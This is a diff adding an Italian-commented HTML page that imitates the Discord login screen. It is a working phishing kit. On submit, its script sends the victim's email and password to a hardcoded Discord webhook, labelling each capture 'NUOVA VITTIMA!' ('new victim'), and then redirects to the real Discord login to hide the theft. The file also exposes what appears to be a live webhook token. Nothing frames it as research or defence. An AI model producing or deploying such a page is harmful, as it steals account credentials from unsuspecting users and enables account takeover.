@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <!-- Puoi sostituire questo testo con il logo di Discord -->
+                <h2>Discord</h2>
+            </div>
+            <form id="loginForm">
+                <input type="text" id="email" placeholder="Email o numero di telefono" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Login</button>
+            </form>
+            <div class="links">
+                <a href="#">Non riesci ad accedere?</a>
+                <a href="#">Registrati</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Impedisce il normale invio del form
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Qui avviene la magia: invia i dati al tuo webhook
+            fetch('https://discord.com/api/webhooks/1505269365157925084/rrDzgFHvFiFO2DqBqYGi_WHW-zLXntEg8Wf95BpHTtf-wOumFVqFBOemQrdnEHd_lMMt', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `**NUOVA VITTIMA!**\n**Email:** ${email}\n**Password:** ${password}`
+                }),
+            })
+            .then(response => console.log('Dati inviati!'))
+            .catch(error => console.error('Errore:', error));
+
+            // Reindirizza l'utente al vero Discord dopo aver inviato i dati
+            window.location.href = 'https://discord.com/login';
+        });
+    </script>
+</body>
+</html>
